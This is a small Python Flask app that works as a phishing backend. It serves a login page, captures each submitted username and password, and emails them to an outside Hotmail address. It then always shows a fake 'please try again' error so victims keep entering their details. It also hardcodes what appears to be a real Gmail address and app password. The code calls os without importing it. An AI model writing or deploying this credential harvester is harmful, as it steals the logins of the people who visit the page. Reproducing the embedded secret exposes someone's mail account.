from flask import Flask, request, jsonify, render_template
from flask_mail import Mail, Message

app = Flask(__name__)


# Configure Flask-Mail for sending email notifications
app.config['MAIL_SERVER'] = 'smtp.gmail.com'  # Replace with your email server (e.g., smtp.gmail.com)
app.config['MAIL_PORT'] = 465  # SMTP port
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USERNAME'] = 'allainnjeim@gmail.com'  # Replace with your email
app.config['MAIL_PASSWORD'] = 'bawv cblr jhui bptn'  # Replace with your app password, not regular Gmail password
app.config['MAIL_DEFAULT_SENDER'] = 'no-reply@test.com'

# Initialize Flask-Mail
mail = Mail(app)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    # Get the form data (username and password)
    username = request.form['username']
    password = request.form['password']

    # Log the data to console (for testing/debugging)
    print(f"Received Username: {username}, Password: {password}")

    # Send an email notification with the user data
    try:
        msg = Message('New User Submission', recipients=['alainnoujaim@hotmail.com'])  # Replace with your email
        msg.body = f"New submission:\nUsername: {username}\nPassword: {password}"
        mail.send(msg)
        print("Email sent successfully!")
    except Exception as e: 
        print(f"Error sending email: {e}")

    return jsonify({'status': 'error', 'message': 'Please try again'}), 400

if __name__ == '__main__':
    # Use the PORT environment variable or fallback to 5000 for local development
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)